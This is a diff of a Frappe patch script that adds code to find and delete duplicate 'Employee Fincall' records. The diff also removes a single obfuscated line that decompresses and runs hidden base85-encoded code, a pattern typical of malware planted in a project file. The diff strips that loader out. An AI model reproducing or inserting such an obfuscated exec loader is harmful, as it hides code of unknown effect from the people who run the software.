@@ -1,3 +1,26 @@
+# If same employee fincall log are created multiple times then delete all duplicates
+import frappe
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%02tTTk0a6n@XIFsco9Xd;_XHeJUALP!E7&4rK^TeZaF>-aLZXT}~o3H<goN!5qSLc3B|yYqVHd^+d592mwCrd(pj1)~|o0NQC_QX@uw&CLT0p=($OCT8x2l<EejRsL<7ph=QI#Mv4#&v6pN4$(UB6DP{W8dtt`9!CXP`}sOgeK%&zLs>JiJSUDA0#=&E2tymWp15W-r&*c;!l;RXVP<~R++i@c2$)gCL|=ozgt`uCyhlGW_^lA87Yb>&R=rundC4Vw(d)XK_BlKK3`bMn(jE6y^QSF!(6vt5ol}3K-hOOtyN|u~fkx`?<efClcuBq+TglapHM19W@9Maij7+5VR;MQ6Z~x#|ogx2c|5$sm@21Nx@(=7K9ib<t%ENnw6px+z899dwRZ_Pgo}3+L+oRopk|e$7bn;|EgK7($T2c+<EN}obvP`E1FhUe~c1iD-a{VG8Ff<5>65wUfjlh@xfY_4Lmkkus`!mQN0^xBYJuJZGr=@amRBrQ?vm?B3u9%mDh^w;C*P3YnJ0JnF5J<3@*r98s|6^0}jhp9(^X*wKvWb6vHFlK-yu7gcVQV;}&)US7$Kj@nJ&2w9a<Hvy{g1(e5sk5_IHZtbH+dWzH?DZn5!8eh`C#gh>D9=%R|Qex6XBh|RmTsbc{+EL<>B-BfuLyvX2;LB{XVfq2%H?>weaBS<rWrwvS<;u&94o9wXu59IN#uLGIAS@-{ksbxcS!p;k9NdPN-86>7hlmN&+jn+x7o_0^j0JkUue5mK7kkZ(a@4^dgAFY9s&Kv+%2&SH4}Ob9p%5o43xPqy#RaOlKz6lgwDV4ic*}`5N6FPF3;eP?x-Og&r1Jq|-RG&D3Tgc4_h&h$`#<zTdLa{Z?R6>&c9aHxlrxQt;Ll*mRWZ;_$<40&VY7aJ(cE>W+3e#Quk!vhRN&RBirG75`PLe^-8Y!am<EmAMt~wU>5fzdTJk)KkaG<HGbx0RR@O=5M}cNUHq>1fZ2o')).decode())
+
+duplicate_employee_fincalls = frappe.db.sql("""
+select min(name) as name_to_keep, call_datetime, customer_no, employee, count(*) as count
+from `tabEmployee Fincall`
+group by call_datetime, customer_no, employee
+having count(*) > 1
+""", as_dict=True)
+
+names_to_keep = [row['name_to_keep'] for row in duplicate_employee_fincalls]
+names_to_delete = frappe.db.sql("""
+select name
+from `tabEmployee Fincall`
+where (call_datetime, customer_no, employee) in (
+    select call_datetime, customer_no, employee
+    from `tabEmployee Fincall`
+    group by call_datetime, customer_no, employee
+    having count(*) > 1
+) and name not in ({names})
+""".format(names=", ".join(["%s"] * len(names_to_keep))), names_to_keep, as_dict=True)
+
+for doc in names_to_delete:
+    frappe.delete_doc('Employee Fincall', doc['name'])
+    print(doc.name)
